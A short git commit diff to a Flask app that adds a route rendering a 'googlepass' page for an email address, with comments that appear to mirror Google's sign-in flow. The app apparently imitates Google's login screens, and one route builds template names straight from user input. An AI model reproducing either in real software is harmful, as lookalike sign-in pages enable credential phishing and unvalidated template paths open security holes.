5abe96f317265706b782a4c4570ee37fd96d46ae
SivaPrakasam7 <prakasams22@gmail.com>
2021-06-09 18:26:30 +0530

    mod

--- app.py
+++ app.py
@@ -1,5 +1,6 @@
 from flask import Flask, render_template, request,session
 import sqlite3
+import re
 
 app=Flask(__name__)
 
@@ -7,12 +8,19 @@ app=Flask(__name__)
 def index():
     return render_template('index.html')
 
+@app.route("/googlepass/<mail>")
+def glogin(mail):
+    if not re.findall(r"@gmail.com",mail):mail+="@gmail.com"
+    return render_template('googlepass.html',act=mail)
+
 @app.route("/<name>",methods=['GET','POST'])
 def login(name):
     return render_template(f'{name}.html')
 
 
 # google account show profileIdentifier
+
+# google next identifierNext
 
 
 if __name__=="__main__":
